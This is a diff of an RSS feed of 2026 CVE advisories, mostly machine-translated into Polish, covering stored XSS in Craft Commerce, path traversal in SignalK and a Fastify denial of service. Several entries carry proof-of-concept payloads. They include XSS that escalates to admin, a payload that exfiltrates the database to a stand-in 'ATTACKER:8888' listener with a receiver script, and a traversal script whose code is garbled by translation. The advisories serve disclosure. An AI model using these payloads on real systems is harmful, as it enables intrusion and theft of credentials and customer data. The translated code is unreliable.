@@ -1,5 +1,607 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-24051</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24051</link><pubDate>Mon, 02 Feb 2026 20:07:46 +0000</pubDate><description>### Wpływ
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-25489</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25489</link><pubDate>Mon, 02 Feb 2026 23:00:13 +0000</pubDate><description>## Podsumowanie
+Zapisana luka XSS w Craft Commerce umożliwia atakującym wykonanie złośliwego kodu JavaScript w przeglądarce administratora.Dzieje się tak, ponieważ pola **Nazwa i opis** w **Strefach podatkowych** nie są odpowiednio oczyszczone przed wyświetleniem w panelu administracyjnym.
+
+
+## Dowód koncepcji
+
+### Wymagania
+- Ogólne uprawnienia:
+- Uzyskaj dostęp do panelu sterowania
+- Uzyskaj dostęp do handlu rzemieślniczego
+- Uprawnienia Craft Commerce:
+- Zarządzaj ustawieniami sklepu
+- Zarządzaj podatkami
+- Aktywna sesja administratora z podwyższonym poziomem uprawnień
+
+### Kroki do odtworzenia
+1. Zaloguj się do Panelu Administracyjnego kontem atakującego z powyższymi uprawnieniami.
+2. Przejdź do **Handel** -&gt; **Zarządzanie sklepem** -&gt; **Strefy podatkowe** (`/admin/commerce/store-management/primary/taxzones`).
+3. Utwórz nową strefę podatkową.
+4. W polu **Nazwa** lub **Opis** wprowadź następujący ładunek:
+```html
+&lt;img src=x onerror="alert(document.domain)"&gt;
+```
+4. Kliknij **Zapisz**, a zostaniesz przekierowany z powrotem na poprzednią stronę.
+5. Zwróć uwagę na alert potwierdzający wykonanie JavaScript.
+&lt;img szerokość="1904" wysokość="418" alt="poc" src="https://github.com/user-attachments/assets/09bd993b-550e-40fe-b2d7-1608e25fbc01" /&gt;
+
+### Eskalacja uprawnień do administratora:
+1. Wykonaj te same kroki powyżej, ale zamień ładunek na złośliwy.
+2. Następujący ładunek podnosi konto atakującego do poziomu administratora, jeśli istnieje już sesja z podwyższonym poziomem uprawnień, zastąp `&lt;UserID&gt;` swoim identyfikatorem atakującego:
+3.
+```html
+&lt;img źródło=xonerror="fetch('/admin/users/&lt;UserID&gt;/permissions',{method:'POST',body:`CRAFT_CSRF_TOKEN=${Craft.csrfTokenValue}&amp;userId=&lt;UserID&gt;&amp;admin=1&amp;action=users/save-permissions`,headers:{'content-type':'application/x-www-form-urlencoded'}})"&gt;
+```
+
+4. W innej przeglądarce zaloguj się jako administrator i przejdź do strony zawierającej luki (strona stref podatkowych).
+5. Wróć do swojego konta atakującego i zauważ, że jesteś teraz administratorem.
+
+Eskalacja uprawnień wymaga sesji z podwyższonym poziomem uprawnień.W rzeczywistym scenariuszu osoba atakująca może zautomatyzować proces, wymuszając wylogowanie, jeśli sesja ofiary jest nieaktualna;po ponownym uwierzytelnieniu przechowywany ładunek XSS jest wykonywany w ramach nowej sesji z podwyższonym poziomem uprawnień, aby zakończyć atak.
+
+Lub jeszcze łatwiej (i mądrzej) atakujący (używając XSS) może utworzyć fałszywą nakładkę modalną logowania „Sesja wygasła”.Ponieważ znajduje się on w domenie zaufanej, administratorzy prawdopodobnie wprowadzą swoje dane uwierzytelniające, wysyłając je bezpośrednio do atakującego.
+
+### Referencje:
+
+https://github.com/craftcms/commerce/commit/fa273330807807d05b564d37c88654cd772839ee</description></item><item><title>CVE-2026-25488</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25488</link><pubDate>Mon, 02 Feb 2026 22:51:51 +0000</pubDate><description>## Podsumowanie
+
+Zapisana luka XSS w Craft Commerce umożliwia atakującym wykonanie złośliwego kodu JavaScript w przeglądarce administratora.Dzieje się tak, ponieważ pola Kategorie podatkowe (nazwa i opis) w sekcji **Zarządzanie sklepem** nie są odpowiednio oczyszczane przed wyświetleniem w panelu administracyjnym.
+
+---
+## Dowód koncepcji
+
+### Wymagania
+- Ogólne uprawnienia:
+- Uzyskaj dostęp do panelu sterowania
+- Uzyskaj dostęp do handlu rzemieślniczego
+- Uprawnienia Craft Commerce:
+- Zarządzaj ustawieniami sklepu
+- Zarządzaj podatkami
+- Aktywna sesja administratora z podwyższonym poziomem uprawnień
+
+### Kroki do odtworzenia
+1. Zaloguj się do Panelu Administracyjnego kontem atakującego z powyższymi uprawnieniami.
+2. Przejdź do **Handel** -&gt; **Zarządzanie sklepem** -&gt; **Kategorie podatkowe** (`/admin/commerce/store-management/primary/taxcategories`).
+3. Utwórz nową kategorię podatkową.
+4. W polu **Nazwa** lub **Opis** wprowadź następujący ładunek:
+```html
+&lt;img src=x onerror="alert(document.domain)"&gt;
+```
+4. Kliknij **Zapisz**, a zostaniesz przekierowany z powrotem na poprzednią stronę.
+5. Zwróć uwagę na alert potwierdzający wykonanie JavaScript.
+
+### Eskalacja uprawnień do administratora:
+1. Wykonaj te same kroki powyżej, ale zamień ładunek na złośliwy.
+2. Następujący ładunek podnosi konto atakującego do poziomu administratora, jeśli istnieje już sesja z podwyższonym poziomem uprawnień, zastąp `&lt;UserID&gt;` swoim identyfikatorem atakującego:
+```html
+&lt;img źródło=xonerror="fetch('/admin/users/&lt;UserID&gt;/permissions',{method:'POST',body:`CRAFT_CSRF_TOKEN=${Craft.csrfTokenValue}&amp;userId=&lt;UserID&gt;&amp;admin=1&amp;action=users/save-permissions`,headers:{'content-type':'application/x-www-form-urlencoded'}})"&gt;
+```
+
+3. W innej przeglądarce zaloguj się jako administrator i przejdź do podatnej strony (strona kategorii podatkowych).
+4. Wróć do swojego konta atakującego i zauważ, że jesteś teraz administratorem.
+
+Eskalacja uprawnień wymaga sesji z podwyższonym poziomem uprawnień.W rzeczywistym scenariuszu osoba atakująca może zautomatyzować proces, wymuszając wylogowanie, jeśli sesja ofiary jest nieaktualna;po ponownym uwierzytelnieniu przechowywany ładunek XSS jest wykonywany w ramach nowej sesji z podwyższonym poziomem uprawnień, aby zakończyć atak.
+
+Lub jeszcze łatwiej (i mądrzej) atakujący (używając XSS) może utworzyć fałszywą nakładkę modalną logowania „Sesja wygasła”.Ponieważ znajduje się on w domenie zaufanej, administratorzy prawdopodobnie wprowadzą swoje dane uwierzytelniające, wysyłając je bezpośrednio do atakującego.
+
+### Referencje:
+
+https://github.com/craftcms/commerce/commit/fa273330807807d05b564d37c88654cd772839ee</description></item><item><title>CVE-2026-25487</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25487</link><pubDate>Mon, 02 Feb 2026 22:51:16 +0000</pubDate><description>## Podsumowanie
+Zapisana luka XSS w Craft Commerce umożliwia atakującym wykonanie złośliwego kodu JavaScript w przeglądarce administratora.Dzieje się tak, ponieważ pole „Nazwa” stawek podatkowych w sekcji **Zarządzanie sklepem** nie zostało odpowiednio oczyszczone przed wyświetleniem w panelu administracyjnym.
+
+## Dowód koncepcji
+
+### Wymagania
+- Ogólne uprawnienia:
+- Uzyskaj dostęp do panelu sterowania
+- Uzyskaj dostęp do handlu rzemieślniczego
+- Uprawnienia Craft Commerce:
+- Zarządzaj ustawieniami sklepu
+- Zarządzaj podatkami
+- Aktywna sesja administratora z podwyższonym poziomem uprawnień
+
+
+### Kroki do odtworzenia
+1. Zaloguj się do Panelu Administracyjnego kontem atakującego z powyższymi uprawnieniami.
+2. Przejdź do **Handel** -&gt; **Zarządzanie sklepem** -&gt; **Stawki podatku** (`/admin/commerce/store-management/primary/taxrates`).
+3. Utwórz nową stawkę podatku.
+4. W polu **Nazwa** wpisz następujący ładunek:
+```html
+&lt;img src=x onerror="alert(document.domain)"&gt;
+```
+4. Wybierz lub utwórz kategorię podatku, ponieważ jest ona wymagana do zapisania stawki podatku.
+5. Kliknij **Zapisz**, a zostaniesz przekierowany z powrotem na poprzednią stronę.
+6. Zwróć uwagę na alert potwierdzający wykonanie JavaScript.
+&lt;img szerokość="1887" wysokość="709" alt="poc-alert" src="https://github.com/user-attachments/assets/cbcebb85-dbc7-467c-aca1-7446a67918f2" /&gt;
+
+
+
+### Eskalacja uprawnień do administratora:
+1. Wykonaj te same kroki powyżej, ale zamień ładunek na złośliwy.
+2. Następujący ładunek podnosi konto atakującego do poziomu administratora, jeśli istnieje już sesja z podwyższonym poziomem uprawnień, zastąp `&lt;UserID&gt;` swoim identyfikatorem atakującego:
+
+```html
+&lt;img źródło=xonerror="fetch('/admin/users/&lt;UserID&gt;/permissions',{method:'POST',body:`CRAFT_CSRF_TOKEN=${Craft.csrfTokenValue}&amp;userId=&lt;UserID&gt;&amp;admin=1&amp;action=users/save-permissions`,headers:{'content-type':'application/x-www-form-urlencoded'}})"&gt;
+```
+4. W innej przeglądarce zaloguj się jako administrator i przejdź do podatnej strony (strona stawek podatkowych).
+5. Wróć do swojego konta atakującego i zauważ, że jesteś teraz administratorem.
+
+Eskalacja uprawnień wymaga sesji z podwyższonym poziomem uprawnień.W rzeczywistym scenariuszu osoba atakująca może zautomatyzować proces, wymuszając wylogowanie, jeśli sesja ofiary jest nieaktualna;po ponownym uwierzytelnieniu przechowywany ładunek XSS jest wykonywany w ramach nowej sesji z podwyższonym poziomem uprawnień, aby zakończyć atak.
+
+Lub jeszcze łatwiej (i mądrzej) atakujący (używając XSS) może utworzyć fałszywą nakładkę modalną logowania „Sesja wygasła”.Ponieważ znajduje się ona w domenie zaufanej, administratorzy prawdopodobnie wprowadzą swoje dane uwierzytelniające, wysyłając je bezpośrednio do atakującego.
+
+### Zasoby:
+
+https://github.com/craftcms/commerce/commit/fa273330807807d05b564d37c88654cd772839ee</description></item><item><title>CVE-2026-25486</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25486</link><pubDate>Mon, 02 Feb 2026 22:49:55 +0000</pubDate><description>## Podsumowanie
+
+Zapisana luka XSS w Craft Commerce umożliwia atakującym wykonanie złośliwego kodu JavaScript w przeglądarce administratora.Dzieje się tak, ponieważ pole Nazwa metod wysyłki w sekcji **Zarządzanie sklepem** nie zostało odpowiednio oczyszczone przed wyświetleniem w panelu administracyjnym.
+
+---
+## Dowód koncepcji
+
+### Wymagania
+- Ogólne uprawnienia:
+- Uzyskaj dostęp do panelu sterowania
+- Uzyskaj dostęp do handlu rzemieślniczego
+- Uprawnienia Craft Commerce:
+- Zarządzaj ustawieniami sklepu
+- Zarządzaj wysyłką
+- Aktywna sesja administratora z podwyższonym poziomem uprawnień
+
+### Kroki do odtworzenia
+
+1. Zaloguj się do Panelu Administracyjnego kontem atakującego z powyższymi uprawnieniami.
+2. Przejdź do **Handel** -&gt; **Zarządzanie sklepem** -&gt; **Metody wysyłki** (`/admin/commerce/store-management/primary/shippingmethods`).
+3. Utwórz nową metodę wysyłki.
+4. W polu **Nazwa** wpisz następujący ładunek:
+```html
+&lt;img src=x onerror="alert(document.domain)"&gt;
+```
+4. Kliknij **Zapisz** i wróć do poprzedniej strony.
+5. Zwróć uwagę na alert potwierdzający wykonanie JavaScript.
+
+
+### Eskalacja uprawnień do administratora:
+
+1. Wykonaj te same kroki powyżej, ale zamień ładunek na złośliwy.
+2. Następujący ładunek podnosi konto atakującego do poziomu administratora, jeśli istnieje już sesja z podwyższonym poziomem uprawnień, zastąp `&lt;UserID&gt;` swoim identyfikatorem atakującego:
+3.
+```html
+&lt;img źródło=xonerror="fetch('/admin/users/&lt;UserID&gt;/permissions',{method:'POST',body:`CRAFT_CSRF_TOKEN=${Craft.csrfTokenValue}&amp;userId=&lt;UserID&gt;&amp;admin=1&amp;action=users/save-permissions`,headers:{'content-type':'application/x-www-form-urlencoded'}})"&gt;
+```
+
+4. W innej przeglądarce zaloguj się jako administrator i przejdź do podatnej strony (strona metod wysyłki).
+5. Wróć do swojego konta atakującego i zauważ, że jesteś teraz administratorem.
+
+Eskalacja uprawnień wymaga sesji z podwyższonym poziomem uprawnień.W rzeczywistym scenariuszu osoba atakująca może zautomatyzować proces, wymuszając wylogowanie, jeśli sesja ofiary jest nieaktualna;po ponownym uwierzytelnieniu przechowywany ładunek XSS jest wykonywany w ramach nowej sesji z podwyższonym poziomem uprawnień, aby zakończyć atak.
+Lub jeszcze łatwiej (i mądrzej) atakujący (używając XSS) może utworzyć fałszywą nakładkę modalną logowania „Sesja wygasła”.Ponieważ znajduje się on w domenie zaufanej, administratorzy prawdopodobnie wprowadzą swoje dane uwierzytelniające, wysyłając je bezpośrednio do atakującego.
+
+### Zasoby:
+
+https://github.com/craftcms/commerce/commit/fa273330807807d05b564d37c88654cd772839ee</description></item><item><title>CVE-2026-25485</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25485</link><pubDate>Mon, 02 Feb 2026 22:45:03 +0000</pubDate><description>## Podsumowanie
+Zapisana luka XSS w Craft Commerce umożliwia atakującym wykonanie złośliwego kodu JavaScript w przeglądarce administratora.Dzieje się tak, ponieważ pola Kategorie wysyłki (nazwa i opis) w sekcji **Zarządzanie sklepem** nie są odpowiednio oczyszczane przed wyświetleniem w panelu administracyjnym.
+
+---
+## Dowód koncepcji
+
+### Wymagania
+- Ogólne uprawnienia:
+- Uzyskaj dostęp do panelu sterowania
+- Uzyskaj dostęp do handlu rzemieślniczego
+- Uprawnienia Craft Commerce:
+- Zarządzaj ustawieniami sklepu
+- Zarządzaj wysyłką
+- Aktywna sesja administratora z podwyższonym poziomem uprawnień
+
+### Kroki do odtworzenia
+
+1. Zaloguj się do Panelu Administracyjnego kontem atakującego z powyższymi uprawnieniami.
+2. Przejdź do **Handel** -&gt; **Zarządzanie sklepem** -&gt; **Kategorie wysyłki** (`/admin/commerce/store-management/primary/shippingcategories`).
+3. Utwórz nową kategorię wysyłki.
+4. W polu **Nazwa** wpisz następujący ładunek:
+```html
+&lt;img src=x onerror="alert(document.domain)"&gt;
+```
+4. Kliknij **Zapisz** i wróć do poprzedniej strony.
+5. Zwróć uwagę na alert potwierdzający wykonanie JavaScript.
+
+
+### Eskalacja uprawnień do administratora:
+
+1. Wykonaj te same kroki powyżej, ale zamień ładunek na złośliwy.
+2. Następujący ładunek podnosi konto atakującego do poziomu administratora, jeśli istnieje już sesja z podwyższonym poziomem uprawnień, zastąp `&lt;UserID&gt;` swoim identyfikatorem atakującego:
+```html
+&lt;img źródło=xonerror="fetch('/admin/users/&lt;UserID&gt;/permissions',{method:'POST',body:`CRAFT_CSRF_TOKEN=${Craft.csrfTokenValue}&amp;userId=&lt;UserID&gt;&amp;admin=1&amp;action=users/save-permissions`,headers:{'content-type':'application/x-www-form-urlencoded'}})"&gt;
+```
+3. W innej przeglądarce zaloguj się jako administrator i przejdź do podatnej strony (strona kategorii wysyłki).
+4. Wróć do swojego konta atakującego i zauważ, że jesteś teraz administratorem.
+
+Eskalacja uprawnień wymaga sesji z podwyższonym poziomem uprawnień.W rzeczywistym scenariuszu osoba atakująca może zautomatyzować proces, wymuszając wylogowanie, jeśli sesja ofiary jest nieaktualna;po ponownym uwierzytelnieniu przechowywany ładunek XSS jest wykonywany w ramach nowej sesji z podwyższonym poziomem uprawnień, aby zakończyć atak.
+
+Lub jeszcze łatwiej (i mądrzej) atakujący (używając XSS) może utworzyć fałszywą nakładkę modalną logowania „Sesja wygasła”.Ponieważ znajduje się on w domenie zaufanej, administratorzy prawdopodobnie wprowadzą swoje dane uwierzytelniające, wysyłając je bezpośrednio do atakującego.
+
+### Zasoby:
+
+https://github.com/craftcms/commerce/commit/fa273330807807d05b564d37c88654cd772839ee</description></item><item><title>CVE-2026-25484</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25484</link><pubDate>Mon, 02 Feb 2026 22:44:05 +0000</pubDate><description>## Podsumowanie
+
+Przechowywane XSS poprzez nazwy typów produktów.Nazwa nie jest oczyszczana, gdy jest wyświetlana w ustawieniach uprawnień użytkownika.
+
+Podatne dane wejściowe (źródło) znajdują się w handlu (ustawienia typu produktu), ale ujście znajduje się w ustawieniach uprawnień użytkownika CMS.Raportowanie do Commerce GHSA, ponieważ dane wejściowe pochodzą stąd.
+
+Użytkownikom zaleca się aktualizację do poprawionej wersji 5.5.2, aby złagodzić problem.
+
+---
+## Dowód koncepcji
+
+### Wymagane uprawnienia (atakujący)
+
+- Dostęp administracyjny (aby edytować ustawienia handlu)
+
+### Kroki do odtworzenia
+
+1. Zaloguj się jako atakujący z uprawnieniami administratora.
+2. Przejdź do **Handel** -&gt; **Ustawienia** -&gt; **Typy produktów** (`/admin/commerce/settings/producttypes`).
+3. Utwórz nowy typ produktu.
+4. Ustaw **Nazwa** na:
+```html
+&lt;img src=x onerror="alert('XSS-ProductType')" ukryty&gt;
+```
+5. Zapisz typ produktu.
+6. Przejdź do **Użytkownicy** -&gt; Edytuj dowolnego użytkownika -&gt; Kliknij zakładkę **Uprawnienia** (`/admin/users/{UserID}/permissions`).
+7. Alert uruchamia się natychmiast (po wyrenderowaniu pola wyboru Typ produktu).
+
+## Zasoby
+
+https://github.com/craftcms/commerce/commit/7e1dedf06038c8e70dce0187b7048d4ab8ffb75c</description></item><item><title>CVE-2026-25483</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25483</link><pubDate>Mon, 02 Feb 2026 22:43:00 +0000</pubDate><description>## Summary
+
+A stored XSS vulnerability exists in Craft Commerce’s Order Status History Message. The message is rendered using the `|md` filter, which permits raw HTML, enabling malicious script execution. If a user has database backup utility permissions (which do not require an elevated session), an attacker can exfiltrate the entire database, including all user credentials, customer PII, order history, and 2FA recovery codes.
+
+Users are recommended to update to the patched 5.5.2 release to mitigate the issue.
+
+---
+## Proof of Concept
+
+### Required Permissions
+
+- General
+	- Access the control panel
+	- Access Craft Commerce
+	- Access to the database backup utility
+- Craft Commerce
+	- Manage orders
+	- Edit orders
+
+### Attacker Server Setup
+
+To reproduce this attack, you need a server to receive the exfiltrated database.
+1. Save the Python script as `receiver.py` on your attacker machine.
+2. Run it: `python3 receiver.py` -- Change the port if needed.
+
+&lt;details&gt;
+
+&lt;summary&gt;Server Python Script&lt;/summary&gt;
+
+```python
+#!/usr/bin/env python3
+"""
+Usage: python3 receiver.py
+"""
+
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import cgi, os
+from datetime import datetime
+
+class Handler(BaseHTTPRequestHandler):
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'POST')
+        self.end_headers()
+
+    def do_POST(self):
+        self.send_response(200)
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        
+        content_type = self.headers.get('Content-Type', '')
+        if 'multipart/form-data' in content_type:
+            form = cgi.FieldStorage(
+                fp=self.rfile, headers=self.headers,
+                environ={'REQUEST_METHOD': 'POST', 'CONTENT_TYPE': content_type}
+            )
+            if 'db' in form:
+                filename = f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql.zip"
+                with open(filename, 'wb') as f:
+                    f.write(form['db'].file.read())
+                print(f"[+] DB saved: {filename} ({os.path.getsize(filename):,} bytes)")
+        
+        self.wfile.write(b"OK")
+
+if __name__ == '__main__':
+    print("[*] Listening on http://0.0.0.0:8888")   # change the port if needed
+    HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
+```
+
+&lt;/details&gt;
+
+### Steps to Reproduce
+
+1. Log in to the admin panel
+2. Navigate to **Commerce** → **Orders**
+3. Create a new order, enter a customer email, and mark the order as completed. The Order should be saved now; if not, save it.
+4. Edit the order
+5. Change the order status, a new text field (Status Message) will appear once the status is changed
+    - Make sure you have multiple order statuses; if not, create one from (/admin/commerce/settings/orderstatuses)
+6. In the **Status Message** field, enter the XSS payload below
+7. Save/Update the order
+8. Log out &amp; log in again with an admin account
+9. Visit the order page (/admin/commerce/orders/{Order_ID})
+10. XSS executes → Full database backup is triggered and exfiltrated
+11. Go back to the attacker’s server and notice a zipped file containing the full exfiltrated database.
+
+### XSS Payload (DB Exfiltration)
+
+**Note:** Replace `ATTACKER:8888` with your listener server.
+```html
+&lt;img src=x onerror="fetch('/index.php?p=admin/actions/utilities/db-backup-perform-action',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=utilities/db-backup-perform-action&amp;CRAFT_CSRF_TOKEN='+Craft.csrfTokenValue+'&amp;downloadBackup=1'}).then(r=&gt;r.blob()).then(b=&gt;{let f=new FormData;f.append('db',b,'backup.sql');fetch('http://ATTACKER:8888/',{method:'POST',body:f})})"&gt;
+```
+
+---
+## Technical Details (Vulnerable Code)
+
+**File:** `vendor/craftcms/commerce/src/templates/orders/_history.twig`
+**Sink:** `{{ orderHistory.message | md }}`
+**Root Cause:** The `|md` Twig filter (Markdown) processes the message but does not sanitize HTML tags.
+
+---
+## Impact
+
+The exfiltrated database backup includes, but is not limited to:
+- Usernames, emails, and password hashes.
+- Customer PII: Names, addresses, and complete order history.
+- Transaction records, customer profiles, and coupon codes.
+- GraphQL tokens.
+- 2FA recovery codes.
+- Potentially, payment gateway secrets (if stored directly instead of using environment variables).
+
+**Note:** This XSS can also be leveraged for the same attacks described in previous reports, including privilege escalation and forced password changes.
+
+---
+## Mitigation
+
+Sanitize the message before rendering:
+```twig
+{{ orderHistory.message | md | purify }}
+```
+
+Or escape HTML before Markdown processing:
+```twig
+{{ orderHistory.message | e | md }}
+```
+
+Additionally, requiring an elevated session for the DB Backup utility would increase the difficulty of exploitation, although it would not prevent the attack, as it might occur while an active elevated session is in place.
+
+## Resources:
+
+https://github.com/craftcms/commerce/commit/4665a47c0961aee311a42af2ff94a7c470f0ad8c</description></item><item><title>CVE-2026-25482</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25482</link><pubDate>Mon, 02 Feb 2026 22:41:44 +0000</pubDate><description>## Podsumowanie
+
+W widgecie panelu kontrolnego **„Ostatnie zamówienia”** istnieje zapisana luka w zabezpieczeniach DOM XSS.Nazwa stanu zamówienia jest renderowana poprzez konkatenację ciągów JavaScript bez odpowiedniej zmiany znaczenia, co umożliwia wykonanie skryptu, gdy dowolny administrator odwiedzi pulpit nawigacyjny.
+
+Użytkownikom zaleca się aktualizację do poprawionej wersji 5.5.2, aby złagodzić problem.
+
+---
+## Dowód koncepcji
+
+### Wymagane uprawnienia
+
+- Dostęp administracyjny (do edycji/tworzenia statusów zamówień)
+
+### Kroki do odtworzenia
+1. Zaloguj się na konto administratora
+2. Przejdź do **Handel** → **Ustawienia** → **Statusy zamówień**
+3. Utwórz nowy status zamówienia (np. „Oczekujące”)
+4. Ustaw pole **Nazwa** na:
+```html
+&lt;img src=x onerror="alert('Statusy zamówień XSS')" ukryty&gt;
+```
+5. Zapisz status zamówienia
+6. Przejdź do Zamówień handlowych i złóż kilka zamówień o różnych statusach (np. „Nowy” i „status utworzenia złośliwego oprogramowania”)
+7. Przejdź do panelu kontrolnego (`/admin/dashboard`) i dodaj widżet **"Ostatnie zamówienia"** i wybierz te same 2 statusy dla zamówień
+8. Zwróć uwagę na wykonanie XSS &lt;imgwidth="1491" height="568" alt="xss-execution-in-dashboard" src="https://github.com/user-attachments/assets/84e8b121-30b9-4029-93be-e90009b6897e" /&gt;
+
+
+---
+## Szczegóły techniczne
+
+**Plik:** `vendor/craftcms/commerce/src/templates/_components/widgets/orders/recent/body.twig`
+
+**Główna przyczyna:** „wartość.nazwa” (nazwa stanu zamówienia) jest łączona bezpośrednio z ciągiem HTML bez oczyszczania.Kiedy JavaScript wstawia ten kod HTML do DOM, wykonywane są wszelkie złośliwe tagi/skrypty w nazwie.&lt;imgwidth="1780" height="858" alt="vulnerable-code" src="https://github.com/user-attachments/assets/b150ee9d-c072-4987-b506-81a29c23d84b" /&gt;
+
+---
+## Łagodzenie
+Użyj `Craft.escapeHtml()` w wywołaniu zwrotnym:
+```javascript
+wywołanie zwrotne: funkcja (wartość) {
+return '&lt;span class="commerceStatusLabel"&gt;&lt;span class="status ' + Craft.escapeHtml(value.color) + '"&gt;&lt;/span&gt;' + Craft.escapeHtml(value.name) + '&lt;/span&gt;';
+}
+```
+
+## Zasoby:
+
+https://github.com/craftcms/commerce/commit/d94d1c9832a47a1c383e375ae87c46c13935ba65</description></item><item><title>CVE-2026-25228</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25228</link><pubDate>Mon, 02 Feb 2026 22:26:31 +0000</pubDate><description>### Podsumowanie
+Luka w zabezpieczeniach Path Traversal w interfejsie API `applicationData` serwera SignalK umożliwia uwierzytelnionym użytkownikom systemów Windows odczytywanie, zapisywanie i wyświetlanie listy dowolnych plików i katalogów w systemie plików.Funkcja `validateAppId()` blokuje ukośniki do przodu (`/`), ale nie ukośniki odwrotne (`\`), które są traktowane jako separatory katalogów przez `path.join()` w systemie Windows.Umożliwia to atakującym ucieczkę z zamierzonego katalogu „applicationData”.
+
+### Szczegóły
+**Platforma**: Windows (Linux umożliwia tylko przeglądanie jednego katalogu)
+**Wymagane uwierzytelnienie**: Tak (możliwość zapisu zależy od zgody użytkownika)
+
+Luka występuje w funkcji `validateAppId()` w procedurze obsługi API applicationData.Ta funkcja sprawdza parametr `appid`, ale sprawdza tylko obecność ukośników:
+
+```javascript
+// Uproszczony wzorzec kodu podatnego na ataki
+funkcja validAppId(appid) {
+if (appid.includes('/') || appid.length &gt;= 30) {
+zwróć fałsz;
+}
+zwróć wartość true;
+}
+
+// Później użyte w konstrukcji ścieżek
+const dataPath = path.join(configPath, 'applicationData', 'users', DeviceId, appid);
+```
+
+**Główna przyczyna:**
+- Walidacja blokuje tylko znaki `/`
+- W systemie Windows `path.join()` używa natywnego separatora ścieżek platformy
+- Windows traktuje `/` i `\` jako prawidłowe separatory katalogów
+- Sekwencje przechodzenia oparte na ukośniku odwrotnym, takie jak sprawdzanie poprawności przebiegu `..\..\..`
+- Kiedy `path.join()` przetwarza je w systemie Windows, każde `..` przechodzi o jeden poziom katalogu w górę
+
+### PoC
+```pyton
+#!/usr/bin/env python3
+
+zaimportuj argparse
+zaimportuj klienta http
+importuj jsona
+importuj sys
+z urllib.parse zaimportuj urlparse
+
+PREFIKS = "/signalk/v1/dane aplikacji"
+
+
+def raw_get(baza, ścieżka, token):
+„””
+GET używając http.client, aby w adresie URL znajdowały się „..” i ukośniki odwrotne
+są wysyłane dosłownie (żądania/urllib znormalizowałyby je).
+„””
+parsed = urlparse(podstawa)
+host, port = parsed.hostname, parsed.port lub 80
+conn = http.client.HTTPConnection(host, port)
+conn.request("GET", ścieżka, nagłówki={"Autoryzacja": f"Nośnik {token}"})
+resp = conn.getresponse()
+status = odpowiednio.status
+treść = resp.read().decode("utf-8", błędy="zamień")
+połącz.zamknij()
+status powrotu, treść
+
+
+zdecydowanie główna():
+ap = argparse.ArgumentParser(description="PoC przejścia ścieżki sygnału K w systemie Windows")
+ap.add_argument("--target", wymagane=True, help="np. http://192.168.1.100:3000")
+ap.add_argument("--token", wymagane=True, help="dowolny prawidłowy token JWT")
+argumenty = ap.parse_args()
+
+podstawa = args.target.rstrip("/")
+
+# W systemie Windows path.join(configPath, "applicationData", "users", id, appid)
+# rozwiązuje każde „..” w górę, jeśli jest oddzielone ukośnikami odwrotnymi.
+#
+# Głębokość od podstawy (configPath/applicationData/users/):
+# .. → applicationData/users/ (1 poziom)
+# ..\.. → applicationData/ (2 poziomy)
+# ..\..\.. → configPath (.signalk) (3 poziomy)
+# ..\..\..\.. → katalog domowy użytkownika (4 poziomy)
+
+przejścia = [
+(„..\\..\\..\\”, „katalog konfiguracyjny .signalk”),
+(„..\\..\\..\\..\\”, „katalog domowy użytkownika”),
+]
+
+dla appid, opis w przejściach:
+ścieżka = f"{PREFIX}/użytkownik/{appid}"
+status, body = raw_get(baza, ścieżka, token, args.token)
+
+print(f"[{status}] {opis}")
+print(f" GET {ścieżka}")
+
+jeśli status == 200:
+spróbuj:
+wpisy = json.loads(body)
+do wpisania we wpisach:
+print(f" {wpis}")
+z wyjątkiem json.JSONDecodeError:
+print(f" {ciało[:200]}")
+inne:
+print(f" {ciało[:200]}")
+drukuj()
+
+
+if __name__ == "__main__":
+główny()
+```
+
+**Etapy reprodukcji:**
+
+1. Skonfiguruj serwer SignalK na komputerze z systemem Windows
+2. Uzyskaj ważny token uwierzytelniający urządzenia lub użytkownika
+3. Uruchom skrypt PoC:
+,,bicie
+python3 poc_windows_appid_traversal.py --target http://[IP serwera SignalK]:3000 --token &lt;TWÓJ_TOKEN&gt;
+```
+
+### Zalecana poprawka
+
+**Krótkoterminowe:**
+1. Dodaj weryfikację ukośnika odwrotnego do `validateAppId()`:
+```javascript
+funkcja validAppId(appid) {
+if (appid.includes('/') || appid.includes('\') || appid.length &gt;= 30) {
+zwróć fałsz;
+}
+zwróć wartość true;
+}
+```
+
+2. Użyj `path.normalize()` i sprawdź, czy rozwiązane ścieżki pozostają w zamierzonym katalogu:
+```javascript
+const rozwiązanyPath = ścieżka.normalize(ścieżka.join(katalog bazowy, appid));
+if (!resolvedPath.startsWith(path.normalize(baseDir))) {
+wyślij nowy błąd („Nieprawidłowa ścieżka”);
+}
+```</description></item><item><title>CVE-2026-25224</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25224</link><pubDate>Mon, 02 Feb 2026 22:25:05 +0000</pubDate><description>### Wpływ
+Luka w zabezpieczeniach typu „odmowa usługi” w obsłudze odpowiedzi strumieni internetowych Fastify może pozwolić zdalnemu klientowi na wyczerpanie pamięci serwera.Ma to wpływ na aplikacje, które zwracają „ReadableStream” (lub „Odpowiedź” z treścią strumienia internetowego) za pośrednictwem metody „reply.send()”.Powolny lub nieczytający klient może wyzwolić nieograniczone buforowanie, gdy przeciwciśnienie zostanie zignorowane, co prowadzi do awarii procesów lub poważnej degradacji.
+
+### Poprawki
